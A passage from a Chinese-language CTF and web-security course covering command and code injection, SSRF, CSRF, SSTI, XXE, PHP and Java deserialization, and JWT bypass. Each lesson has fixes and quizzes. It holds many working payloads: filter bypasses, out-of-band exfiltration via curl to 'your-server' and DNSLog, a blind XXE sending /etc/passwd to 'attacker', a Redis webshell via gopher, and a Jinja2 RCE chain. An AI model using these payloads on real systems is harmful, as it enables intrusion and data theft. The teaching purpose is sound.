+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>分清「执行系统命令」和「执行语言代码」，掌握分隔符、过滤绕过与无回显处理。</p></div>
+<p>这两类漏洞的注入内容不同：命令执行注入的是 <b>shell 语法</b>，代码执行注入的是 <b>目标语言的代码</b>。同一个输入口，后面挂的函数不同，利用方式就完全不同。</p>
+<div class="tablewrap"><div class="tcap">两者的区别</div><table><thead><tr><th>类型</th><th>典型函数</th><th>注入内容</th><th>例子</th></tr></thead><tbody><tr><td>命令执行</td><td>system / exec / shell_exec / passthru / 反引号</td><td>shell 命令与分隔符</td><td>127.0.0.1; cat /flag</td></tr><tr><td>代码执行</td><td>eval / assert / create_function / preg_replace 的 /e</td><td>目标语言代码</td><td>phpinfo(); 或 system('cat /flag');</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">漏洞代码与修复 · php</div><pre><code>&lt;?php
+// 危险：把用户输入拼进命令
+$ip = $_GET['ip'];
+system("ping -c 1 " . $ip);
+//  ?ip=127.0.0.1; cat /flag
+//  ?ip=127.0.0.1 | cat /flag
+
+// 正确：先校验格式，再转义参数
+if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
+system("ping -c 1 " . escapeshellarg($ip));
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">命令分隔与绕过</div><table><thead><tr><th>被过滤的</th><th>替代写法</th><th>备注</th></tr></thead><tbody><tr><td>分隔符 ;</td><td>|  ||  &  &&  换行(%0a)</td><td>管道会把前面输出喂给后面</td></tr><tr><td>空格</td><td>$IFS、%09、$IFS$9、{cat,/etc/passwd}</td><td>花括号展开不需要空格</td></tr><tr><td>关键字 cat</td><td>ca""t、c\at、tac、nl、more、head</td><td>引号和反斜杠插入</td></tr><tr><td>关键字 flag</td><td>/fl''ag、/fl\ag、通配符 /fl*</td><td>shell 会还原</td></tr><tr><td>路径 /</td><td>cd / && cat flag、$PWD 拼接</td><td>或者直接相对路径</td></tr><tr><td>命令回显被过滤</td><td>先写到文件再访问、外带 DNS/HTTP</td><td>无回显场景</td></tr></tbody></table></div>
+<h3>无回显的四种处理</h3>
+<ol class="steps"><li><b>写文件</b>：<code>cat /flag > /var/www/html/1.txt</code>，再访问 <code>/1.txt</code>。</li><li><b>带外 HTTP</b>：<code>curl http://your-server/?x=$(cat /flag | base64)</code>，在自己服务器上看日志。</li><li><b>DNSLog</b>：<code>nslookup $(cat /flag).your.dnslog.cn</code>，用 DNS 查询把数据带出去（很多 WAF 允许出站 DNS）。</li><li><b>时间侧信道</b>：<code>sleep $(cat /flag | cut -c1)</code>，靠响应时间判断一个字符（很慢，但什么通道都没有时能用）。</li></ol>
+<blockquote class="note">💡 最常见的误区：看到命令执行就急着 <code>cat /flag</code>。先确认三件事——<b>回显有没有、flag 在哪、有没有出网</b>。路径不对就先 <code>ls /</code>、<code>find / -name 'flag*'</code>。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>命令执行和代码执行的注入内容有什么本质不同？</li><li>空格被过滤可以用什么替代？给出两种写法。</li><li>无回显时怎么确认命令真的执行了？</li><li>escapeshellarg 为什么能防命令注入？</li><li>flag 不在 /flag 时，你会用哪条命令去找？</li></ol>
+</article>
+<article id="l-p5l9">
+<h2>SSRF：让服务器替你访问</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。</p></div>
+<p>SSRF（Server-Side Request Forgery）的本质：<b>服务器会去访问你给的地址，而你给了一个它本不该访问的地址。</b>它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。</p>
+<div class="code"><div class="cbar">典型漏洞代码 · php</div><pre><code>&lt;?php
+// 功能：图片加载 / URL 预览 / 远程下载
+$url = $_GET['url'];
+echo file_get_contents($url);
+
+// 正常：?url=https://example.com/a.png
+// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
+// 攻击：?url=file:///etc/passwd               （读本地文件）
+// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">协议与用途</div><table><thead><tr><th>协议</th><th>用途</th><th>说明</th></tr></thead><tbody><tr><td>http / https</td><td>打内网 Web 服务</td><td>最常见</td></tr><tr><td>file://</td><td>读本地文件</td><td>PHP 默认允许</td></tr><tr><td>dict://</td><td>探测端口、打 Redis/Memcached</td><td>dict://127.0.0.1:6379/info</td></tr><tr><td>gopher://</td><td>构造任意 TCP 报文（打 Redis、MySQL、FastCGI）</td><td>能发原始字节，利用面最广</td></tr><tr><td>ftp:// / tftp://</td><td>探测内网文件服务</td><td>有时可用</td></tr></tbody></table></div>
+<h3>判断 SSRF 是否存在</h3>
+<ol class="steps"><li>找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。</li><li>喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。</li><li>试 <code>http://127.0.0.1:端口</code> 扫内网端口：响应时间/内容不同就是服务存活。</li><li>试 <code>file:///etc/passwd</code> 读文件；试 <code>http://169.254.169.254/</code> 读云元数据。</li><li>拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。</li></ol>
+<div class="code"><div class="cbar">gopher 打 Redis 的思路 · bash</div><pre><code># Redis 未授权：直接写 webshell 或写 crontab
+# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
+# 常用工具：Gopherus、SSRFmap
+
+# 简化示意：gopher://127.0.0.1:6379/_&lt;URL编码后的RESP&gt;
+# 关键命令序列：CONFIG SET dir /var/www/html -&gt; CONFIG SET dbfilename 1.php -&gt; SET x "&lt;?php ...?&gt;" -&gt; SAVE</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见过滤与绕过</div><table><thead><tr><th>过滤方式</th><th>绕过写法</th></tr></thead><tbody><tr><td>过滤 127.0.0.1</td><td>127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io</td></tr><tr><td>过滤 localhost</td><td>同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网）</td></tr><tr><td>只允许 http://</td><td>302 跳转绕过：自己的服务器跳回内网地址</td></tr><tr><td>校验 URL 前缀</td><td>user@host 形式：http://expected.com@evil.com/</td></tr><tr><td>校验 host 但没校验端口</td><td>直接换端口找内网服务</td></tr><tr><td>禁 file 协议</td><td>用 gopher / dict 曲线读文件或打服务（取决于库）</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">修复：白名单 + 解析后校验 · php</div><pre><code>&lt;?php
+// 1. 只允许明确需要的协议
+$scheme = parse_url($url, PHP_URL_SCHEME);
+if (!in_array($scheme, ['http', 'https'])) die("协议不允许");
+
+// 2. 解析域名成 IP，再判断是不是内网地址
+$host = parse_url($url, PHP_URL_HOST);
+$ip = gethostbyname($host);
+if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+    die("内网地址不允许");
+}
+
+// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION =&gt; false）
+// 4. 出站流量走统一代理，在代理层做白名单
+?&gt;</code></pre></div>
+<blockquote class="note">💡 SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是<b>出站白名单代理</b>，而不是在代码里做黑名单过滤。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">PortSwigger · SSRF</a></li><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · SSRF 专项</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>SSRF 为什么能绕过防火墙？</li><li>169.254.169.254 是什么地址？拿到它能干什么？</li><li>DNS 重绑定怎么绕过「只允许公网 IP」的校验？</li><li>为什么说 SSRF 的修复比利用更难？</li><li>写出两种绕过 127.0.0.1 过滤的写法。</li></ol>
+</article></section>
+<section class="mod" id="m-p5b"><h1>PART 8 · 高级漏洞</h1><div class="sub">第 15–18 周 · 9 节</div><blockquote class="note">需要更多前置知识的漏洞：CSRF、模板注入、XML、反序列化、认证绕过、逻辑漏洞、NoSQL、原型链污染。全部要学，学到这里你已经开始「读源码找链」而不是「背 payload」。</blockquote><article id="l-p5l10">
+<h2>CSRF：借你的手发请求</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解「浏览器自动带 Cookie」为什么能变成攻击，以及 Token / SameSite / Origin 各自防住了什么。</p></div>
+<p>CSRF（跨站请求伪造）不偷你的 Cookie，也不读你的数据。它只做一件事：<b>让浏览器带着你的 Cookie，去发一个你没想发的请求。</b>因为 Cookie 是「按域名自动附带的」，浏览器不会问「这是不是你自己点的」。</p>
+<div class="code"><div class="cbar">最小 PoC（攻击者页面） · html</div><pre><code>&lt;!-- 受害者登录了 bank.com 后，访问攻击者页面即触发 --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input name="to" value="hacker"&gt;
+  &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit()&lt;/script&gt;
+
+&lt;!-- 页面看起来什么都没发生，请求已经带着受害者的 Cookie 发出去了 --&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">成立条件与防护手段</div><table><thead><tr><th>条件 / 手段</th><th>说明</th></tr></thead><tbody><tr><td>前提 1</td><td>目标用 Cookie 维持身份（Session/Cookie 认证）</td></tr><tr><td>前提 2</td><td>敏感操作只校验「有没有登录」，没有额外凭证</td></tr><tr><td>CSRF Token</td><td>每个表单带一次性随机令牌，攻击者跨站拿不到它</td></tr><tr><td>SameSite Cookie</td><td>Lax：跨站 POST 不带 Cookie；Strict：跨站一律不带</td></tr><tr><td>校验 Origin/Referer</td><td>请求来源不是自己站点就拒绝</td></tr><tr><td>二次验证</td><td>转账/改密要求再输密码或验证码（最稳）</td></tr></tbody></table></div>
+<h3>为什么 CSRF Token 能防住</h3>
+<p>同源策略让攻击者的页面<b>读不到</b>目标站点的页面内容——包括页面里的 Token。所以攻击者能「让浏览器发请求」，但发不出「带正确 Token 的请求」。这就是 CSRF 防护的核心逻辑：<b>把「身份」和「本次操作」绑在一起。</b></p>
+<div class="code"><div class="cbar">后端怎么校验 Token · php</div><pre><code>&lt;?php
+session_start();
+// 生成：只有本站页面能拿到这个值
+$token = bin2hex(random_bytes(16));
+$_SESSION['csrf'] = $token;
+// 页面：&lt;input type="hidden" name="csrf" value="&lt;?= $token ?&gt;"&gt;
+
+// 校验：POST 上来的 token 必须和 session 里的一致
+if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
+    die("CSRF token 校验失败");
+}
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">常见变体 · html</div><pre><code>GET 型：&lt;img src="https://bank.com/transfer?to=hacker&amp;amount=10000"&gt;
+  -&gt; 说明敏感操作绝不能用 GET
+
+JSON 型：需要用表单发 application/json 通常不行，
+  但目标若接收 text/plain 或 x-www-form-urlencoded 的 JSON，就能打
+
+配合 XSS：XSS 能读页面里的 Token，CSRF 防护直接失效
+  -&gt; 所以 XSS 比 CSRF 危险得多</code></pre></div>
+<blockquote class="note">💡 CTF 里 CSRF 题常考「让你构造一个 PoC 页面并提交给 bot 访问」。要点：<b>表单自动提交、目标站点的 Cookie 要被带上、别用 fetch（会被 CORS 拦）</b>。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener">PortSwigger · CSRF</a></li><li><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions" target="_blank" rel="noopener">PortSwigger · SameSite 与 CSRF</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>CSRF 为什么不需要知道受害者的 Cookie？</li><li>SameSite=Lax 能防住哪类 CSRF，防不住哪类？</li><li>有了 XSS 之后 CSRF Token 还有用吗？为什么？</li><li>为什么敏感操作不能用 GET？</li><li>写出一个最小 CSRF PoC 页面的结构。</li></ol>
+</article>
+<article id="l-p5l11">
+<h2>SSTI：模板注入</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能识别「用户输入被当模板解析」，知道 Jinja2/Twig/FreeMarker 的探测与利用思路。</p></div>
+<p>模板引擎本来负责把数据填进 HTML。但如果你能把 <code>{{ ... }}</code> 之类的内容塞进模板<b>源码</b>，模板引擎就会把它当表达式求值——这就是 SSTI（服务端模板注入）。它通常来自「用用户输入拼模板」或「用模板引擎渲染用户提供的字符串」。</p>
+<div class="code"><div class="cbar">漏洞是怎么产生的 · php</div><pre><code>&lt;?php
+// 危险：把用户输入当成模板源码渲染
+$name = $_GET['name'];
+echo $twig-&gt;render('Hello {{ name }}', ['name' =&gt; ...]);   // 安全（name 只是数据）
+
+// 危险写法（很多教学题故意这么写）
+echo $twig-&gt;createTemplate('Hello ' . $_GET['name'])-&gt;render([]);
+// 输入 {{7*7}} 就会输出 49
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">一句话判断有没有 SSTI</div><table><thead><tr><th>输入</th><th>回显</th><th>说明</th></tr></thead><tbody><tr><td>{{7*7}}</td><td>49</td><td>Jinja2（Python）、Twig（PHP）、Spring 的 Thymeleaf 类</td></tr><tr><td>${7*7}</td><td>49</td><td>FreeMarker（Java）、部分 Thymeleaf 表达式</td></tr><tr><td><%= 7*7 %></td><td>49</td><td>ERB（Ruby）</td></tr><tr><td>#{7*7}</td><td>49</td><td>Ruby 插值、部分 Java 表达式语言</td></tr><tr><td>${7*7} 或 {{7*7}} 无变化</td><td>原样</td><td>可能被转义，或没有 SSTI</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">Jinja2（Flask）常见探测与利用思路 · python</div><pre><code># 1. 确认模板引擎
+{{7*7}}
+
+# 2. 看配置（Flask 的 config 对象是全局的）
+{{ config }}
+{{ config.items() }}
+
+# 3. 从内置对象出发，找能执行命令的类
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# 在返回的大列表里找 Popen / os 相关类，再调用
+{{ ''.__class__.__mro__[1].__subclasses__()[&lt;下标&gt;]('id',shell=True).communicate() }}
+
+# 4. 常见过滤绕过思路
+#   .__ 被过滤   -&gt; 用 attr 过滤器：{{ 'a'.__class__ }} 换成 {{ 'a'|attr('__class__') }}
+#   [] 被过滤    -&gt; 用 ( ) 调用的等价方式
+#   关键字被过滤 -&gt; 用字符串拼接或 request.args 传参</code></pre></div>
+<div class="code"><div class="cbar">算一下探测链的原理 · python</div><pre><code># ''.__class__            -&gt; &lt;class 'str'&gt;
+# ''.__class__.__mro__    -&gt; (str, object)   找基类
+# [1] 就是 object
+# object.__subclasses__() -&gt; 所有已加载的子类
+# 目标：找到能执行命令的类（如 subprocess.Popen）或能读文件的类
+#
+# 所以整条链是：字符串对象 -&gt; 它的类 -&gt; 基类 -&gt; 全部子类 -&gt; 挑一个危险类 -&gt; 调用</code></pre></div>
+<blockquote class="note">💡 SSTI 的利用链和「沙箱里有什么对象」强相关：同一个 payload 在本地能跑，在题目里可能因为禁了某个类就失效。所以必须<b>有源码就看源码，没源码就逐个探测</b>——这是最依赖「读源码」能力的一类题。</blockquote>
+<h3>修复</h3>
+<ul><li>用户输入永远只作为<b>模板变量</b>传入，不要拼进模板源码。</li><li>必须动态渲染时，用沙箱化模板（如 Jinja2 SandboxedEnvironment）并限制可用对象。</li><li>把模板引擎的调试模式关掉；错误信息不要直接回显。</li><li>限制模板能访问的对象：传入 <code>autoescape=True</code>，禁用 <code>__</code> 属性访问。</li></ul>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">PortSwigger · SSTI</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">SSTI 常用 payload 合集</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>{{7*7}} 返回 49，说明服务器上发生了什么？</li><li>SSTI 利用为什么要从「字符串的类」出发？</li><li>Flask 的 config 对象为什么能泄露信息？</li><li>说出两种常见过滤（__ / []）的绕过思路。</li><li>为什么说 SSTI 是最依赖读源码的一类题？</li></ol>
+</article>
+<article id="l-p5l12">
+<h2>XXE：XML 外部实体</h2>
+<div class="meta">约 30 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解 XML 实体为什么能读文件、打内网，以及盲 XXE 的带外思路。</p></div>
+<p>XML 允许在 DOCTYPE 里定义「实体」，实体的值可以是一个外部 URI。解析器读到 <code>&xxe;</code> 时，会去读取那个 URI 指向的内容并替换进来——如果这个 URI 是 <code>file:///etc/passwd</code>，服务端文件就被读出来了。</p>
+<div class="code"><div class="cbar">最小 PoC（有回显） · xml</div><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></div>
+<div class="code"><div class="cbar">盲 XXE：把内容带外 · xml</div><pre><code>&lt;!-- 页面不回显，用外部 DTD 把读到的内容拼进请求发给攻击者 --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"&gt;
+  %dtd;
+]&gt;
+
+&lt;!-- evil.dtd 内容：把 %file 的内容塞进 URL 参数，向攻击者发起请求 --&gt;
+&lt;!-- &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker/?d=%file;'&gt;"&gt; %all; --&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">XXE 的三种打法</div><table><thead><tr><th>场景</th><th>手法</th><th>前提</th></tr></thead><tbody><tr><td>有回显</td><td>直接 &xxe; 读文件</td><td>解析结果的字段被显示出来</td></tr><tr><td>无回显</td><td>外部 DTD 把内容带外（OOB）</td><td>服务器能主动访问外网（DNS/HTTP）</td></tr><tr><td>无外网</td><td>报错信息带出（error-based）</td><td>报错被回显，且实体能被拼进报错</td></tr><tr><td>打内网</td><td>ENTITY 指向内网 http 服务，做 SSRF</td><td>服务器能访问内网</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">进阶：读 PHP 源码（绕过 filter 限制） · xml</div><pre><code>&lt;!-- 读不到文件时，用 php://filter 让文件内容变成 base64 再带出 --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php"&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre></div>
+<p><b>前提条件</b>：服务的 XML 解析器允许外部实体。PHP 的 libxml 2.9 以前默认开启，之后默认关闭（但代码里用 <code>LIBXML_NOENT</code> 等选项仍可能打开）。Java 的 DocumentBuilderFactory 默认也有此问题，需要手动关闭。</p>
+<h3>修复</h3>
+<ul><li>禁用 DTD 与外部实体：PHP 用 libxml_disable_entity_loader(true)（旧版），新环境用 <code>LIBXML_NONET</code>。</li><li>Java：<code>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</code>。</li><li>Python：lxml 用 <code>resolve_entities=False</code>；defusedxml 直接替换标准库解析器。</li><li>实在不需要 XML 就换成 JSON。</li></ul>
+<blockquote class="note">💡 XXE 题的第一动作是<b>确认 XML 解析点有没有回显</b>。有回显就直接读；没有就先试 DNSLog 看有没有回连（判断能否带外），再决定用 OOB 还是报错。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">PortSwigger · XXE</a></li><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · XXE 专项</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>XXE 依赖哪个 XML 特性？</li><li>盲 XXE 怎么把数据带出来？需要什么前提？</li><li>为什么新版 libxml 默认没有这个问题？</li><li>php://filter 在 XXE 里有什么用处？</li><li>列出两条修复 XXE 的方法。</li></ol>
+</article>
+<article id="l-p5l13">
+<h2>反序列化（PHP）</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>看懂 PHP 序列化字符串，理解魔术方法如何被串成利用链（pop chain）。</p></div>
+<p>序列化是把对象变成字符串，反序列化是把字符串还原成对象。危险点在于：<b>反序列化一个可控的字符串，等于让攻击者构造对象。</b>而对象在被创建、销毁、被当字符串用时，会自动触发魔术方法——这些魔术方法里如果有危险函数，就有了链。</p>
+<div class="code"><div class="cbar">序列化格式 · php</div><pre><code>&lt;?php
+class A { public $cmd = "whoami"; }
+echo serialize(new A());
+// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}
+
+// O: 对象  s: 字符串  i: 整数  a: 数组  b: 布尔  N: null
+// 数字是长度，必须完全匹配，否则解析失败
+// -&gt; 这也是绕过技巧：改长度/属性个数，让 __wakeup 前的解析行为变化
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">魔术方法 = 链上的触发点 · php</div><pre><code>__construct()   new 时调用（反序列化时不触发）
+__wakeup()      反序列化时立刻调用
+__destruct()    对象销毁时调用
+__toString()    被当字符串用时调用（echo / 拼接）
+__call()        调用不存在的方法时
+__get()/__set() 访问不存在属性时
+__sleep()       序列化时调用
+__invoke()      对象被当函数调用时
+
+// 典型链：unserialize 入口 -&gt; __wakeup -&gt; ... -&gt; __destruct -&gt; 危险函数</code></pre></div>
+<div class="code"><div class="cbar">一个最小的利用链 · php</div><pre><code>&lt;?php
+class Start {
+    public $obj;
+    function __destruct() {
+        $this-&gt;obj-&gt;run();      // 销毁时调用 obj 的 run()
+    }
+}
+class Exec {
+    public $cmd;
+    function run() {
+        eval($this-&gt;cmd);        // 危险函数
+    }
+}
+// 构造：让 Start.obj 指向 Exec，并把 cmd 设成我们的代码
+$payload = new Start();
+$payload-&gt;obj = new Exec();
+$payload-&gt;obj-&gt;cmd = "system('id');";
+echo serialize($payload);
+// 提交这串字符串给 unserialize() 即可执行
+?&gt;</code></pre></div>
+<h3>找链的方法（重点）</h3>
+<ol class="steps"><li>先找入口：代码里哪里调用了 <code>unserialize()</code>，参数是否可控。</li><li>列出所有魔术方法：每个类里有哪些 <code>__wakeup</code> / <code>__destruct</code> / <code>__toString</code>。</li><li>从魔术方法里找「能被我控制的方法调用」：<code>$this->x->y()</code> 这种，x 可控就能换类。</li><li>顺着调用走，直到遇到危险函数（eval、system、include、文件写）。</li><li>把路径上的属性值按顺序填好，序列化出来提交。</li><li>工具：phpggc 可以生成常见框架的链（ThinkPHP、Laravel、Guzzle）。</li></ol>
+<div class="tablewrap"><div class="tcap">常见过滤与绕过</div><table><thead><tr><th>过滤</th><th>绕过思路</th></tr></thead><tbody><tr><td>过滤 O: 开头</td><td>用 a: 数组嵌套对象；或用 C: 自定义序列化</td></tr><tr><td>过滤 "类名"</td><td>大小写、字符串偏移、PHP 7.4 的 C: 格式</td></tr><tr><td>校验属性个数</td><td>改 O:1:"A":1: 里的 1 为 2（旧版 PHP 会跳过 __wakeup 的某些检查）</td></tr><tr><td>__wakeup 里 die</td><td>用 __destruct 链，或触发其他魔术方法</td></tr></tbody></table></div>
+<blockquote class="note">💡 反序列化不是「背 payload」，而是<b>读代码找路径</b>。真正的题目里类都藏在框架源码里，所以要会顺着 composer.json 找依赖、顺着自动加载找类文件。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc（PHP 反序列化链生成）</a></li><li><a href="https://www.ctfhub.com/" target="_blank" rel="noopener">CTFHub · PHP 反序列化</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>s:3:"cmd" 里的 3 代表什么？长度不对会怎样？</li><li>为什么 __destruct 常被用作链尾？</li><li>pop 链是什么意思？</li><li>写出找链的第一步和第二步。</li><li>phpggc 是做什么的？</li></ol>
+</article>
+<article id="l-p5l14">
+<h2>反序列化（Java）与组件漏洞</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>知道 Java 反序列化的入口、识别组件与版本，理解 ysoserial 与 JNDI 注入。</p></div>
+<p>Java 的反序列化问题更「工程化」：入口很多，利用链大多来自第三方库（CommonsCollections 等），所以题目的难点是<b>识别组件和版本</b>，而不是从零构造链。</p>
+<div class="code"><div class="cbar">Java 反序列化的入口 · text</div><pre><code>ObjectInputStream.readObject()
+
+常见的数据位置：
+- Cookie / Header：rememberMe、X-Auth 等 base64 字段
+- 表单参数：base64 后的序列化字节（开头是 rO0AB）
+- RMI / RPC / JNDI 调用
+- 框架内部：Shiro、Fastjson、Jackson、XStream</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见利用链家族</div><table><thead><tr><th>组件</th><th>利用链</th><th>特征</th></tr></thead><tbody><tr><td>CommonsCollections 3.x</td><td>CC1 / CC3 / CC5 / CC6 / CC7</td><td>commons-collections.jar 版本</td></tr><tr><td>CommonsBeanutils</td><td>CB1</td><td>commons-beanutils.jar</td></tr><tr><td>Shiro</td><td>rememberMe 反序列化</td><td>Cookie 里有 rememberMe=deleteMe 或 base64 大串</td></tr><tr><td>Fastjson</td><td>autoType 绕过</td><td>JSON 里 @type 字段</td></tr><tr><td>Log4j2</td><td>JNDI 注入（log4shell）</td><td>日志里出现 ${jndi:ldap://...}</td></tr><tr><td>Jackson</td><td>多态反序列化</td><td>enableDefaultTyping 配置</td></tr></tbody></table></div>
+<h3>做题流程</h3>
+<ol class="steps"><li>看到 <code>rO0AB</code> 开头的 base64，或名为 rememberMe 的 Cookie，基本可以确定是 Java 反序列化。</li><li>去找组件：能读源码就看 pom.xml / build.gradle / Web-INF/lib；不能读就靠报错、栈信息、页面指纹。</li><li>确定版本区间：同一家族的不同版本对应不同链（如 CC3 与 CC1 的 payload 不同）。</li><li>用 ysoserial 生成对应链的 payload，做 base64 后提交。</li><li>JNDI 类场景，改用 ldap/rmi 外部服务接收请求（JNDIExploit、rogue-jndi）。</li></ol>
+<div class="code"><div class="cbar">ysoserial 基本用法 · bash</div><pre><code># 生成 CC1 链的 payload（执行命令）
+java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" &gt; payload.bin
+
+# base64 后提交
+base64 -w0 payload.bin
+
+# 常见链名
+# CommonsCollections1/3/5/6/7、CommonsBeanutils1、URLDNS（只做探测）</code></pre></div>
+<blockquote class="note">💡 Java 题最省时间的判断：<b>先看有没有 rO0AB / rememberMe / Fastjson 的 @type</b>。有就直接走对应链，没有就去读依赖列表。版本号决定了用哪条链，这一步错了 payload 一定打不通。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></li><li><a href="https://github.com/feihong-cs/JNDIExploit" target="_blank" rel="noopener">JNDI 注入工具 JNDIExploit</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Java 反序列化的入口函数是什么？</li><li>Shiro 的 rememberMe 为什么是经典入口？</li><li>为什么「确定版本」比「找链」更关键？</li><li>ysoserial 是做什么的？URLDNS 链有什么特别？</li><li>log4shell 的触发字符串长什么样？</li></ol>
+</article>
+<article id="l-p5l15">
+<h2>认证绕过：Session / JWT / Cookie</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>掌握三类「冒充身份」的常用手法，并能用工具验证。</p></div>
+<p>认证绕过是 CTF 里性价比最高的一类：不用拿 shell，改一个字段就能进后台。</p>
+<div class="code"><div class="cbar">JWT 的四类攻击 · text</div><pre><code>1. alg 改成 none，删掉签名段
+   {"alg":"none"} . payload . （空签名）
+   -&gt; 服务器若没显式拒绝 none，直接通过
+
+2. 弱密钥爆破
+   用 jwt_tool / hashcat，字典来自常见弱口令
+
+3. 算法混淆（RS256 -&gt; HS256）
+   前提：服务器用公钥验证，但代码里把公钥当 HS256 的密钥用
+   -&gt; 用公钥当 HMAC 密钥重新签名
+
+4. kid 注入
+   kid 指向可控文件（../dev/null）或直接拼进 SQL
+   -&gt; 用空密钥 / 用已知文件内容当密钥</code></pre></div>
+<div class="code"><div class="cbar">jwt_tool 常用命令 · bash</div><pre><code>python3 jwt_tool.py &lt;JWT&gt; -M at            # 自动跑各种攻击
+python3 jwt_tool.py &lt;JWT&gt; -C -d wordlist.txt # 爆破 HS256 密钥
+python3 jwt_tool.py &lt;JWT&gt; -X a             # alg=none
+python3 jwt_tool.py &lt;JWT&gt; -X k -pk public.pem  # 算法混淆</code></pre></div>
+<div class="tablewrap"><div class="tcap">Session / Cookie 攻击面</div><table><thead><tr><th>手法</th><th>说明</th></tr></thead><tbody><tr><td>session id 可预测</td><td>时间戳、自增值、MD5(用户名) 之类</td></tr><tr><td>伪造 Cookie 里的权限字段</td><td>role=admin、is_admin=1，后端直接信任</td></tr><tr><td>Session Fixation</td><td>让受害者用攻击者已知的 session id 登录</td></tr><tr><td>Cookie 里是序列化数据</td><td>PHP/Java 反序列化入口</td></tr><tr><td>JWT 放在 localStorage</td><td>XSS 可直接读走</td></tr></tbody></table></div>
+<h3>判断顺序（按成本从低到高）</h3>
